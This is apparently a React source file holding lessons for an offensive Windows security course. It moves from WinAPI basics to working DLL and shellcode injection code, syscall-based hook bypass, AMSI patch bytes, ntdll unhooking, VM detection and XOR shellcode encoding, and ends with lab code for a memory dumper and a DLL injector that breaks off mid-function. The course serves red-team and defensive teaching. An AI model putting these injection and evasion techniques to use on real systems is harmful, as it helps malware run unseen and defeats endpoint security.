import { Card } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { BookOpen, Lightbulb, AlertTriangle, Code, Sparkles, CheckCircle2 } from "lucide-react";

interface LessonViewerProps {
  moduleId: string;
}

const LessonViewer = ({ moduleId }: LessonViewerProps) => {
  const lessons: Record<string, any> = {
    fundamentals: {
      title: "C/C++ WinAPI Fundamentals",
      description: "Learn the essential building blocks of Windows programming",
      sections: [
        {
          type: "intro",
          content: `Welcome! In this module, you'll learn the basics of Windows programming. Don't worry if you're new to this - we'll explain everything step by step with plenty of examples.`
        },
        {
          title: "Windows Data Types - Why They Matter",
          content: `Think of Windows data types as a special language Microsoft created to make sure programs work correctly on all computers.

**The Problem:** If you use regular 'int', it might be different sizes on different computers.
**The Solution:** Windows types like DWORD are ALWAYS the same size everywhere.`,
          tip: `Think of these types as "guaranteed sizes" - DWORD is ALWAYS 32 bits, no matter what computer you're on.`,
          concepts: [
            { label: "BYTE", explanation: "8 bits (0-255) - Use for small numbers or single characters" },
            { label: "WORD", explanation: "16 bits (0-65,535) - Rarely used today" },
            { label: "DWORD", explanation: "32 bits - Most common, use for IDs, sizes, counts" },
            { label: "HANDLE", explanation: "A reference ticket to a Windows resource (file, process, etc.)" }
          ],
          example: {
            title: "Simple Example - Using Windows Types",
            description: "Here's how you use these types in real code:",
            code: `#include <windows.h>
#include <stdio.h>

int main() {
    // Process ID - use DWORD
    DWORD processId = GetCurrentProcessId();
    printf("My PID: %lu\\n", processId);
    
    // Handle to a file
    HANDLE hFile = CreateFileW(
        L"test.txt",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open file!\\n");
        return 1;
    }
    
    printf("File opened!\\n");
    CloseHandle(hFile);
    return 0;
}`,
            language: "c"
          },
          warning: `Never forget to call CloseHandle()! If you don't close handles, your program will leak resources.`
        },
        {
          title: "Handles - Your Access Tickets",
          content: `A HANDLE is like a ticket that Windows gives you to use something. You can't access Windows resources directly (that would be unsafe!), so Windows gives you a "ticket" instead.

**Real World Analogy:**
• You give a coat check your coat
• They give you a ticket (HANDLE)
• When you show the ticket, they give you your coat back
• The ticket is only valid in that location`,
          tip: `Handles are like claim tickets - they're only valid in your program.`,
          example: {
            title: "Working with Process Handles",
            code: `#include <windows.h>
#include <stdio.h>

int main() {
    DWORD targetPID = 1234;  // Replace with real PID
    
    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION,
        FALSE,
        targetPID
    );
    
    if (hProcess == NULL) {
        DWORD error = GetLastError();
        printf("Failed! Error: %lu\\n", error);
        if (error == 5) {
            printf("Access Denied - try Administrator\\n");
        }
        return 1;
    }
    
    printf("Got handle: 0x%p\\n", hProcess);
    CloseHandle(hProcess);
    return 0;
}`,
            language: "c"
          }
        },
        {
          title: "Error Handling",
          content: `In Windows programming, things fail ALL THE TIME. You MUST check for errors!

**The Pattern:**
1. Call a Windows function
2. Check if it failed
3. Call GetLastError() to find out why`,
          warning: `Never ignore return values! If you don't check for errors, your program will crash.`,
          example: {
            title: "Proper Error Handling",
            code: `#include <windows.h>
#include <stdio.h>

void PrintError(const char* op) {
    DWORD error = GetLastError();
    printf("[ERROR] %s failed: %lu\\n", op, error);
}

int main() {
    HANDLE hFile = CreateFileW(
        L"nonexistent.txt",
        GENERIC_READ, 0, NULL,
        OPEN_EXISTING, 0, NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("CreateFile");
        return 1;
    }
    
    CloseHandle(hFile);
    return 0;
}`,
            language: "c"
          },
          tip: `Common error codes: ERROR_ACCESS_DENIED (5), ERROR_FILE_NOT_FOUND (2), ERROR_INVALID_PARAMETER (87)`
        }
      ]
    },
    "windows-internals": {
      title: "Windows Internals & Win32 API",
      description: "Master Windows architecture, processes, threads, and the Win32 API",
      sections: [
        {
          type: "intro",
          content: `Welcome to Windows Internals! Here you'll learn how Windows really works under the hood - processes, threads, memory, and the powerful Win32 API.`
        },
        {
          title: "Process Architecture",
          content: `A process is like a container for a running program. It has its own memory space, handles, and one or more threads.

**What makes up a process:**
• Virtual address space (memory)
• Executable code
• Open handles to system objects
• Security context (token)
• One or more threads of execution`,
          concepts: [
            { label: "Process", explanation: "A container for code execution with its own memory space" },
            { label: "Thread", explanation: "The actual unit that executes code - a process has at least one" },
            { label: "PEB", explanation: "Process Environment Block - contains process info like loaded DLLs" },
            { label: "TEB", explanation: "Thread Environment Block - per-thread data structure" }
          ],
          example: {
            title: "Get Process Information",
            description: "Query basic process information:",
            code: `#include <windows.h>
#include <stdio.h>

int main() {
    // Get our own process info
    DWORD pid = GetCurrentProcessId();
    HANDLE hProcess = GetCurrentProcess();
    
    printf("Process ID: %lu\\n", pid);
    printf("Handle: 0x%p\\n", hProcess);
    
    // Query memory info
    PROCESS_MEMORY_COUNTERS pmc;
    pmc.cb = sizeof(pmc);
    
    if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
        printf("Working Set: %llu KB\\n", 
            pmc.WorkingSetSize / 1024);
        printf("Page Faults: %lu\\n", 
            pmc.PageFaultCount);
    }
    
    return 0;
}`,
            language: "c"
          }
        },
        {
          title: "Enumerating Processes",
          content: `One of the most common tasks is listing all running processes. The Toolhelp API makes this easy.

**Steps:**
1. Create a snapshot of the system
2. Loop through all processes
3. Get details from PROCESSENTRY32`,
          tip: `Always set pe32.dwSize = sizeof(pe32) before calling Process32First - this is a very common bug!`,
          example: {
            title: "List All Processes",
            code: `#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

int main() {
    HANDLE hSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, 0
    );
    
    if (hSnap == INVALID_HANDLE_VALUE) {
        printf("Snapshot failed\\n");
        return 1;
    }
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);  // IMPORTANT!
    
    if (Process32FirstW(hSnap, &pe32)) {
        do {
            wprintf(L"[%5lu] %s\\n", 
                pe32.th32ProcessID,
                pe32.szExeFile);
        } while (Process32NextW(hSnap, &pe32));
    }
    
    CloseHandle(hSnap);
    return 0;
}`,
            language: "c"
          }
        },
        {
          title: "Virtual Memory",
          content: `Windows uses virtual memory - each process thinks it has its own private memory space. The OS maps virtual addresses to physical RAM.

**Key concepts:**
• Each process has 4GB (32-bit) or 128TB (64-bit) virtual space
• Pages are 4KB chunks of memory
• Memory can be Reserved, Committed, or Free`,
          concepts: [
            { label: "VirtualAlloc", explanation: "Allocates memory in your process" },
            { label: "VirtualAllocEx", explanation: "Allocates memory in another process" },
            { label: "VirtualProtect", explanation: "Changes memory protection (RWX permissions)" },
            { label: "VirtualFree", explanation: "Releases allocated memory" }
          ],
          example: {
            title: "Allocate and Use Memory",
            code: `#include <windows.h>
#include <stdio.h>

int main() {
    // Allocate 4KB of memory
    LPVOID mem = VirtualAlloc(
        NULL,                    // Let Windows choose
        4096,                    // Size in bytes
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE           // Read/write access
    );
    
    if (!mem) {
        printf("Allocation failed\\n");
        return 1;
    }
    
    printf("Allocated at: 0x%p\\n", mem);
    
    // Use the memory
    strcpy((char*)mem, "Hello, Memory!");
    printf("Content: %s\\n", (char*)mem);
    
    // Free the memory
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}`,
            language: "c"
          },
          warning: `Always free memory you allocate! Memory leaks can crash long-running programs.`
        }
      ]
    },
    "process-injection": {
      title: "Process Injection & Memory",
      description: "Advanced memory manipulation and process injection techniques",
      sections: [
        {
          type: "intro",
          content: `Process injection allows you to execute code in another process's context. This is used for debugging, security tools, and unfortunately, by malware. Understanding these techniques is crucial for both offense and defense.`
        },
        {
          title: "Classic DLL Injection",
          content: `The most common injection technique. You write the path to a DLL in the target process, then create a thread that calls LoadLibrary.

**Steps:**
1. OpenProcess with appropriate rights
2. VirtualAllocEx - allocate memory for the DLL path
3. WriteProcessMemory - write the DLL path
4. CreateRemoteThread - call LoadLibraryA`,
          concepts: [
            { label: "OpenProcess", explanation: "Get a handle with VM_WRITE and THREAD rights" },
            { label: "VirtualAllocEx", explanation: "Allocate memory in target process" },
            { label: "WriteProcessMemory", explanation: "Write data to target process" },
            { label: "CreateRemoteThread", explanation: "Create a thread in target process" }
          ],
          warning: `This technique is heavily monitored by security products. Don't run on systems you don't own!`,
          example: {
            title: "DLL Injection Steps",
            code: `#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD pid, const char* dllPath) {
    // Step 1: Open the target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, pid
    );
    if (!hProcess) return FALSE;
    
    // Step 2: Allocate memory for DLL path
    size_t pathLen = strlen(dllPath) + 1;
    LPVOID remoteMem = VirtualAllocEx(
        hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!remoteMem) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Step 3: Write DLL path to target
    WriteProcessMemory(
        hProcess, remoteMem,
        dllPath, pathLen, NULL
    );
    
    // Step 4: Create remote thread
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)LoadLibraryA,
        remoteMem, 0, NULL
    );
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return hThread != NULL;
}`,
            language: "c"
          }
        },
        {
          title: "Shellcode Injection",
          content: `Instead of loading a DLL, you can inject raw shellcode (position-independent code) directly.

**The difference:**
• DLL Injection: Loads a file from disk (leaves traces)
• Shellcode Injection: Everything in memory (stealthier)`,
          tip: `Shellcode must be position-independent - it can't rely on fixed addresses because you don't know where it will land.`,
          example: {
            title: "Basic Shellcode Injection",
            code: `#include <windows.h>
#include <stdio.h>

BOOL InjectShellcode(DWORD pid, BYTE* code, SIZE_T size) {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, pid
    );
    if (!hProcess) return FALSE;
    
    // Allocate executable memory
    LPVOID remoteMem = VirtualAllocEx(
        hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // RWX for code
    );
    
    if (!remoteMem) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Write shellcode
    WriteProcessMemory(
        hProcess, remoteMem,
        code, size, NULL
    );
    
    // Execute it
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL, 0, NULL
    );
    
    if (hThread) CloseHandle(hThread);
    CloseHandle(hProcess);
    return hThread != NULL;
}`,
            language: "c"
          }
        },
        {
          title: "Process Hollowing",
          content: `Process hollowing creates a suspended process, unmaps its memory, and replaces it with malicious code.

**Why use it?**
• The process looks legitimate (e.g., notepad.exe)
• But it's running your code
• Great for evading process monitoring`,
          concepts: [
            { label: "CREATE_SUSPENDED", explanation: "Create process but don't run it yet" },
            { label: "NtUnmapViewOfSection", explanation: "Remove the original code" },
            { label: "VirtualAllocEx", explanation: "Allocate space for new code" },
            { label: "SetThreadContext", explanation: "Point execution to your code" }
          ],
          warning: `Process hollowing is a well-known technique. Modern EDRs detect the unmapping and rewriting patterns.`
        }
      ]
    },
    syscalls: {
      title: "Syscalls & Native API",
      description: "Direct syscall invocation and NTDLL internals",
      sections: [
        {
          type: "intro",
          content: `Syscalls are the gateway between user-mode and kernel-mode. Understanding them lets you bypass user-mode hooks that security products use for monitoring.`
        },
        {
          title: "What are Syscalls?",
          content: `When you call a Windows API function, it eventually needs to talk to the kernel. This happens through syscalls.

**The chain:**
1. Your code calls WriteFile()
2. kernel32.dll does setup
3. ntdll.dll makes the actual syscall
4. Kernel does the work

**Why care?**
Security products hook ntdll.dll to monitor API calls. If you make syscalls directly, you bypass their hooks!`,
          concepts: [
            { label: "SSN", explanation: "System Service Number - the syscall's ID number" },
            { label: "ntdll.dll", explanation: "The bridge between user-mode and kernel" },
            { label: "syscall", explanation: "x64 instruction that transitions to kernel" },
            { label: "sysenter", explanation: "x86 instruction for the same purpose" }
          ],
          example: {
            title: "Finding Syscall Numbers",
            code: `#include <windows.h>
#include <stdio.h>

// Find the syscall number for an Nt function
DWORD GetSSN(LPCSTR functionName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;
    
    FARPROC func = GetProcAddress(ntdll, functionName);
    if (!func) return -1;
    
    BYTE* bytes = (BYTE*)func;
    
    // x64 syscall stub pattern:
    // 4C 8B D1    mov r10, rcx
    // B8 XX XX    mov eax, SSN
    
    printf("First 8 bytes of %s:\\n", functionName);
    for (int i = 0; i < 8; i++) {
        printf("%02X ", bytes[i]);
    }
    printf("\\n");
    
    // SSN is at offset 4
    return *(DWORD*)(bytes + 4) & 0xFFFF;
}

int main() {
    DWORD ssn = GetSSN("NtAllocateVirtualMemory");
    printf("SSN: %lu (0x%X)\\n", ssn, ssn);
    return 0;
}`,
            language: "c"
          }
        },
        {
          title: "Direct Syscalls",
          content: `Direct syscalls mean you make the syscall instruction yourself, completely bypassing ntdll.dll.

**The challenge:**
SSN numbers change between Windows versions! You need to find them dynamically.

**Common approaches:**
1. Read them from ntdll.dll at runtime
2. Use Hell's Gate technique
3. Have a lookup table for each Windows version`,
          tip: `Hell's Gate and Halo's Gate are techniques to find SSNs even when ntdll is hooked by reading neighboring functions.`,
          example: {
            title: "Direct Syscall in Assembly",
            description: "What a direct syscall looks like:",
            code: `; x64 direct syscall
mov r10, rcx          ; Windows calling convention
mov eax, 0x18         ; SSN for NtAllocateVirtualMemory
syscall               ; Transition to kernel
ret

; The SSN (0x18) varies by Windows version!
; Windows 10 1909: 0x18
; Windows 10 2004: 0x18  
; Windows 11: might be different

; In C, you'd use inline assembly or a separate .asm file`,
            language: "asm"
          },
          warning: `Direct syscalls look suspicious. EDRs are now detecting the syscall instruction itself when it comes from unexpected locations.`
        },
        {
          title: "Indirect Syscalls",
          content: `To avoid detection of syscall instructions in your code, you can jump to the syscall in ntdll.dll itself!

**How it works:**
1. Set up registers like normal
2. Jump to the syscall instruction IN ntdll.dll
3. Kernel sees the call coming from ntdll (looks legit)`,
          concepts: [
            { label: "Direct", explanation: "syscall instruction in YOUR code" },
            { label: "Indirect", explanation: "Jump to syscall in ntdll.dll" },
            { label: "Syswhispers", explanation: "Tool that generates syscall stubs" }
          ]
        }
      ]
    },
    pinvoke: {
      title: "P/Invoke & .NET Interop",
      description: "C# unmanaged code interop and marshalling",
      sections: [
        {
          type: "intro",
          content: `P/Invoke (Platform Invocation Services) lets C# call native Windows API functions. It's the bridge between managed .NET code and unmanaged Windows code.`
        },
        {
          title: "P/Invoke Basics",
          content: `To call a Windows function from C#, you declare it with the DllImport attribute.

**Key things to get right:**
• The DLL name
• The exact function name (case-sensitive!)
• Parameter types (C types → C# types)
• Return type`,
          concepts: [
            { label: "DllImport", explanation: "Attribute that declares a native function" },
            { label: "extern", explanation: "Keyword indicating external implementation" },
            { label: "IntPtr", explanation: "C# type for pointers and handles" },
            { label: "Marshal", explanation: "Class for data conversion between managed/unmanaged" }
          ],
          example: {
            title: "Basic P/Invoke Examples",
            code: `using System;
using System.Runtime.InteropServices;

class Program {
    // Simple function - no parameters
    [DllImport("kernel32.dll")]
    static extern uint GetCurrentProcessId();
    
    // Function with parameters
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern int MessageBoxW(
        IntPtr hWnd,
        string text,
        string caption,
        uint type
    );
    
    // Function returning a handle
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(
        uint access,
        bool inheritHandle,
        uint processId
    );
    
    static void Main() {
        uint pid = GetCurrentProcessId();
        Console.WriteLine($"My PID: {pid}");
        
        MessageBoxW(IntPtr.Zero, 
            "Hello from C#!", "P/Invoke", 0);
    }
}`,
            language: "csharp"
          },
          tip: `Always use SetLastError = true if you need to call Marshal.GetLastWin32Error() to get error codes.`
        },
        {
          title: "Structure Marshalling",
          content: `When Windows functions use structures, you need to define matching C# structs with the right layout.

**Key attributes:**
• [StructLayout(LayoutKind.Sequential)] - fields in order
• [MarshalAs(...)] - control how fields are converted`,
          example: {
            title: "Marshalling Structures",
            code: `using System;
using System.Runtime.InteropServices;

// Match the Windows PROCESSENTRY32W structure
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
struct PROCESSENTRY32W {
    public uint dwSize;
    public uint cntUsage;
    public uint th32ProcessID;
    public IntPtr th32DefaultHeapID;
    public uint th32ModuleID;
    public uint cntThreads;
    public uint th32ParentProcessID;
    public int pcPriClassBase;
    public uint dwFlags;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
    public string szExeFile;
}

class Program {
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateToolhelp32Snapshot(
        uint flags, uint processId);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern bool Process32FirstW(
        IntPtr snapshot, ref PROCESSENTRY32W entry);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern bool Process32NextW(
        IntPtr snapshot, ref PROCESSENTRY32W entry);
    
    static void Main() {
        IntPtr snap = CreateToolhelp32Snapshot(0x2, 0);
        
        var entry = new PROCESSENTRY32W();
        entry.dwSize = (uint)Marshal.SizeOf(entry);
        
        if (Process32FirstW(snap, ref entry)) {
            do {
                Console.WriteLine(
                    $"[{entry.th32ProcessID}] {entry.szExeFile}");
            } while (Process32NextW(snap, ref entry));
        }
    }
}`,
            language: "csharp"
          }
        },
        {
          title: "D/Invoke - Dynamic Invocation",
          content: `D/Invoke loads functions dynamically at runtime instead of using static P/Invoke. This helps evade static analysis.

**Why use D/Invoke?**
• P/Invoke declarations are visible in the binary
• Static analysis tools can see what APIs you use
• D/Invoke resolves functions at runtime`,
          concepts: [
            { label: "GetProcAddress", explanation: "Finds a function in a loaded DLL" },
            { label: "GetModuleHandle", explanation: "Gets handle to already-loaded DLL" },
            { label: "Delegates", explanation: "C# function pointers used to call the resolved function" }
          ],
          warning: `D/Invoke is well-known now. Sophisticated EDRs monitor for dynamic resolution patterns.`
        }
      ]
    },
    evasion: {
      title: "Evasion Techniques",
      description: "AV/EDR bypass and anti-analysis methods",
      sections: [
        {
          type: "intro",
          content: `Evasion techniques help code avoid detection by security products. Understanding these is essential for both red teamers and defenders.`
        },
        {
          title: "AMSI Bypass",
          content: `AMSI (Antimalware Scan Interface) lets Windows Defender scan scripts before execution. PowerShell, VBScript, and .NET use it.

**Common bypass methods:**
1. Patch AmsiScanBuffer to return "clean"
2. Unload the AMSI DLL
3. Null out the AMSI context`,
          concepts: [
            { label: "AMSI", explanation: "Antimalware Scan Interface - scans scripts" },
            { label: "AmsiScanBuffer", explanation: "The function that does the scanning" },
            { label: "Patching", explanation: "Overwriting function code to change behavior" }
          ],
          example: {
            title: "AMSI Patch Concept",
            description: "How AMSI patching works (educational):",
            code: `// CONCEPT ONLY - for understanding
// AmsiScanBuffer normally returns a scan result

// The patch makes it return immediately with "clean"
// By writing these bytes at the function start:

// x64 patch bytes:
// B8 57 00 07 80    mov eax, 0x80070057 (invalid param)
// C3                ret

// In code, you would:
// 1. Get address of AmsiScanBuffer
// 2. Change memory protection to RWX
// 3. Write the patch bytes
// 4. Restore protection

// This is detected by most EDRs now!
// They monitor for writes to amsi.dll`,
            language: "c"
          },
          warning: `AMSI bypass is heavily monitored. Many bypass techniques are now signatures themselves.`
        },
        {
          title: "API Unhooking",
          content: `Security products "hook" functions by replacing their first bytes with a jump to monitoring code. Unhooking restores the original bytes.

**The process:**
1. Read a fresh copy of ntdll.dll from disk
2. Find the hooked function
3. Copy the original bytes back`,
          example: {
            title: "Unhooking Concept",
            code: `#include <windows.h>
#include <stdio.h>

// Simplified unhooking concept
void UnhookFunction(LPCSTR funcName) {
    // 1. Get the hooked function address
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC func = GetProcAddress(ntdll, funcName);
    
    // 2. Read fresh ntdll from disk
    HANDLE hFile = CreateFileA(
        "C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL
    );
    
    // 3. Map it and find the original bytes
    // (This is simplified - real code needs to 
    // parse PE headers to find the function)
    
    // 4. Copy original bytes over the hook
    // VirtualProtect + memcpy + VirtualProtect
    
    printf("Unhooking %s...\\n", funcName);
    CloseHandle(hFile);
}`,
            language: "c"
          },
          tip: `Some EDRs now detect unhooking by monitoring reads of ntdll.dll from disk or by re-hooking functions.`
        },
        {
          title: "Sleep Obfuscation",
          content: `When malware sleeps (waits), its code is still in memory and can be scanned. Sleep obfuscation encrypts the code during sleep.

**Techniques:**
• Ekko - Uses timers to encrypt/decrypt
• Foliage - Similar with different implementation
• The code encrypts itself before sleeping, decrypts when waking`,
          concepts: [
            { label: "Sleep", explanation: "When code is waiting, not executing" },
            { label: "Memory Scanning", explanation: "EDRs scan process memory for malware signatures" },
            { label: "Encryption", explanation: "Making the code unreadable while sleeping" }
          ]
        },
        {
          title: "VM & Sandbox Detection",
          content: `Malware often checks if it's running in a VM or sandbox before executing. If detected, it exits cleanly.

**Common checks:**
• VM processes (vmtoolsd.exe, vboxservice.exe)
• VM registry keys
• Disk size (sandboxes often have small disks)
• Number of files (real systems have more files)
• User interaction (sandboxes don't move the mouse)`,
          example: {
            title: "Simple VM Detection",
            code: `#include <windows.h>
#include <stdio.h>

BOOL IsVM() {
    HKEY hKey;
    
    // Check VMware
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    // Check VirtualBox
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    return FALSE;
}

int main() {
    if (IsVM()) {
        printf("VM detected - exiting\\n");
        return 0;
    }
    printf("Running on real hardware\\n");
    return 0;
}`,
            language: "c"
          }
        }
      ]
    },
    shellcode: {
      title: "Shellcode Development",
      description: "Position-independent code and payload development",
      sections: [
        {
          type: "intro",
          content: `Shellcode is raw, position-independent machine code. It's called "shellcode" because historically it was used to spawn a shell. Today it refers to any injectable code.`
        },
        {
          title: "What Makes Shellcode Special?",
          content: `Shellcode must work wherever it's loaded in memory. Normal programs rely on fixed addresses - shellcode can't do that.

**Requirements:**
• Position Independent (no hardcoded addresses)
• Self-contained (no external dependencies)
• Usually small and efficient
• No null bytes (for string-based exploits)`,
          concepts: [
            { label: "PIC", explanation: "Position Independent Code - works at any address" },
            { label: "RIP-relative", explanation: "x64 addressing relative to current instruction" },
            { label: "Null-free", explanation: "No 0x00 bytes which could break string handling" }
          ],
          example: {
            title: "Simple Shellcode - Return",
            description: "The simplest shellcode just returns:",
            code: `; x64 shellcode that just returns
; Assembled bytes: C3

ret     ; Just return to caller

; To test:
unsigned char code[] = { 0xC3 };

LPVOID mem = VirtualAlloc(NULL, sizeof(code),
    MEM_COMMIT | MEM_RESERVE, 
    PAGE_EXECUTE_READWRITE);
    
memcpy(mem, code, sizeof(code));
((void(*)())mem)();  // Execute it`,
            language: "asm"
          }
        },
        {
          title: "Finding Functions Without Imports",
          content: `Normal code uses the Import Address Table. Shellcode must find functions at runtime.

**The technique (PEB walking):**
1. Get PEB from the TEB
2. Find the loader data
3. Walk the module list to find kernel32.dll
4. Parse its export table to find functions`,
          example: {
            title: "Finding Kernel32 (Pseudocode)",
            code: `; Get PEB from TEB
mov rax, gs:[0x60]    ; PEB pointer

; Get Ldr (loader data)
mov rax, [rax+0x18]   ; PEB->Ldr

; Get first module in list
mov rax, [rax+0x20]   ; InMemoryOrderModuleList

; Walk the list to find kernel32.dll
; (Check module name, keep walking until found)

; Once found, parse the PE export table
; to find GetProcAddress
; Then use GetProcAddress to find everything else!`,
            language: "asm"
          },
          tip: `Once you have GetProcAddress, you can find any function. It's the key to making shellcode work.`
        },
        {
          title: "Writing Shellcode in C",
          content: `You don't have to write shellcode in assembly! Write in C with special compiler settings.

**The approach:**
1. Write C code with no external dependencies
2. Compile as position-independent
3. Extract the .text section
4. That's your shellcode!`,
          concepts: [
            { label: "-fPIC", explanation: "GCC flag for position-independent code" },
            { label: "No CRT", explanation: "Don't link C runtime library" },
            { label: "Intrinsics", explanation: "Compiler-built-in functions that don't need imports" }
          ],
          example: {
            title: "Shellcode-friendly C",
            code: `// Compile with special flags:
// No standard library
// Position independent
// No stack protector

// All functions must be resolved at runtime
typedef void* (WINAPI *pLoadLibrary)(char*);
typedef void* (WINAPI *pGetProcAddress)(void*, char*);

void shellcode_main() {
    // Get kernel32 base via PEB walking
    void* kernel32 = find_kernel32();
    
    // Find GetProcAddress
    pGetProcAddress gpa = find_export(
        kernel32, "GetProcAddress");
    
    // Now use gpa to find other functions
    pLoadLibrary ll = gpa(kernel32, "LoadLibraryA");
    
    // Load user32 and show a message box
    void* user32 = ll("user32.dll");
    // ... continue
}`,
            language: "c"
          }
        },
        {
          title: "Encoding and Encryption",
          content: `Raw shellcode contains signatures that AV can detect. Encoding or encrypting it helps evade detection.

**Common techniques:**
• XOR encoding (simple, fast)
• AES encryption (stronger)
• Custom encoders (unique to you)

**The stub:**
Your shellcode needs a decoder stub that runs first to decrypt the payload.`,
          example: {
            title: "XOR Encoder",
            code: `#include <stdio.h>

void xor_encode(unsigned char* data, int len, 
                unsigned char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    // Original shellcode (just ret)
    unsigned char shellcode[] = { 0xC3 };
    unsigned char key = 0x41;
    
    printf("Original: ");
    for (int i = 0; i < sizeof(shellcode); i++)
        printf("%02X ", shellcode[i]);
    
    xor_encode(shellcode, sizeof(shellcode), key);
    
    printf("\\nEncoded:  ");
    for (int i = 0; i < sizeof(shellcode); i++)
        printf("%02X ", shellcode[i]);
    
    // At runtime, XOR again to decode
    xor_encode(shellcode, sizeof(shellcode), key);
    
    printf("\\nDecoded:  ");
    for (int i = 0; i < sizeof(shellcode); i++)
        printf("%02X ", shellcode[i]);
    
    return 0;
}`,
            language: "c"
          },
          warning: `Simple XOR is easily detected. Modern AV can decrypt and scan. Use multiple layers of encoding.`
        }
      ]
    },
    labs: {
      title: "Practical Labs",
      description: "Build real security tools step-by-step",
      sections: [
        {
          type: "intro",
          content: `Time to put everything together! In these labs, you'll build real tools that demonstrate the concepts you've learned. Each lab includes complete working code.`
        },
        {
          title: "Lab 1: Process Memory Dumper",
          content: `Build a tool that dumps the memory of a running process. This is useful for malware analysis and debugging.

**What you'll learn:**
• Opening processes with the right permissions
• Reading process memory
• Saving data to files`,
          example: {
            title: "Process Dumper",
            code: `#include <windows.h>
#include <stdio.h>

BOOL DumpProcessMemory(DWORD pid, LPCWSTR outFile) {
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid
    );
    
    if (!hProcess) {
        printf("Failed to open process: %lu\\n", 
            GetLastError());
        return FALSE;
    }
    
    HANDLE hFile = CreateFileW(outFile,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = si.lpMinimumApplicationAddress;
    
    while (addr < si.lpMaximumApplicationAddress) {
        if (VirtualQueryEx(hProcess, addr, &mbi, 
            sizeof(mbi)) == sizeof(mbi)) {
            
            if (mbi.State == MEM_COMMIT && 
                (mbi.Protect & PAGE_READWRITE)) {
                
                BYTE* buffer = malloc(mbi.RegionSize);
                SIZE_T bytesRead;
                
                if (ReadProcessMemory(hProcess, addr,
                    buffer, mbi.RegionSize, &bytesRead)) {
                    
                    DWORD written;
                    WriteFile(hFile, buffer, 
                        bytesRead, &written, NULL);
                }
                free(buffer);
            }
            addr = (LPVOID)((DWORD_PTR)mbi.BaseAddress 
                + mbi.RegionSize);
        } else {
            addr = (LPVOID)((DWORD_PTR)addr + 0x1000);
        }
    }
    
    CloseHandle(hFile);
    CloseHandle(hProcess);
    return TRUE;
}`,
            language: "c"
          }
        },
        {
          title: "Lab 2: DLL Injector",
          content: `Build a complete DLL injector with error handling. This combines many concepts from the course.

**Features:**
• Process selection by name or PID
• DLL path validation
• Proper cleanup`,
          example: {
            title: "Complete DLL Injector",
            code: `#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindProcess(const wchar_t* name) {
    HANDLE snap = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, 0);
    
    PROCESSENTRY32W pe = { sizeof(pe) };
    
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(snap, &pe));
    }
    
    CloseHandle(snap);
    return 0;
}

BOOL Inject(DWORD pid, const char* dllPath) {
    printf("[*] Opening process %lu...\\n", pid);
    
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | 
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE,
        FALSE, pid
    );
